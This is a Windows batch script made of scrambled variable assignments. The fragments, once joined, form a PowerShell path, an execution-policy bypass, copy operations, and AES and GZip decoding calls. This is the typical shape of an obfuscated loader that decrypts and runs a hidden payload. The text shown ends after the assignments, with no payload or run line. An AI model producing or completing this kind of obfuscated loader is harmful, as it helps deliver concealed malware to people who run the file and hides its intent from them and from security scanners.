@echo off
set "VTAPfostKc=\W"
set "ROKaZNdJYs= /"
set "xlwHOqmnVJ=\v"
set "RmmZnbkKfW= C"
set "XNVPkWUvFz=0\"
set "hNvnuaBIHe=:\"
set "pAXifihNGW=Wi"
set "XoTrxlOuFy=we"
set "lIsjgXvPeN=rS"
set "hbgPQHFEZk=we"
set "rqwvrbTTFF=.e"
set "zYhoPkXbhy=co"
set "UweiFVRjAh=Sy"
set "NCmAZNFTUn=in"
set "fgQlorYgfu=em"
set "ZGPTpXigeY=po"
set "WQgxwmFbfa=ws"
set "iENTptobzP=he"
set "dkGTBftleI=y "
set "YEwcGuuOWf=Po"
set "osGUedDMSs=st"
set "rmVmMmLibN=nd"
set "HZoOgrpeTe=s\"
set "amWkqNcbXu=ow"
set "kuUdXVGfZD=ll"
set "XKegkHdKbB=do"
set "vQHwKsQQTZ=he"
set "YFJjWtAZce=1."
set "hYMVoKpGwS=rs"
set "AyoruiIWTw=py"
set "HCJmCrtJfx=xe"
set "XHpWTDhNFu=32"
set "noNWDHXPZl=ll"
set "cBxvnQILYY= %~dp0"
set "sECQYiMdCD=cd"
set "eHXkuTBduR=vert"
set "elEhoHMSNB=.Ass"
set "DoYnlsIVcU=.Dis"
set "NFCqaqlMXh=rofi"
set "dnOQXEESbt=-joi"
set "MnutKveyXR=LkW."
set "XKsRBTttwa=rTFU"
set "KfoJIwcFZc=ect "
set "ZBJujslnar=.Cop"
set "PuFyrQtcBk=ose("
set "XAtKePiMrD=Disp"
set "yTIZQYeGZl=rtS4"
set "VMvqHRlCSV=-1.."
set "wVTmsjpqsY=e = "
set "lYMhtkFrEr='gni"
set "bnSSYrxXyt=-ep "
set "TKQDwMjBum=Conv"
set "ISHuGhVmsi=);$t"
set "SZAiVlshFR=S46e"
set "oQecckkwLd=($cD"
set "upFcEiwIXg=gth)"
set "uaKOWvwWDb=pher"
set "OdVunmflpn=6esa"
set "FTKxtanjZn=xp.T"
set "wihNLdOyEy=ment"
set "LSXOxhrZgL=New-"
set "LMerDPpWen=raph"
set "pnZcosDiZa=y]::"
set "oIoQPZWtZu=m(, "
set "ohWJcoduoV=.GZi"
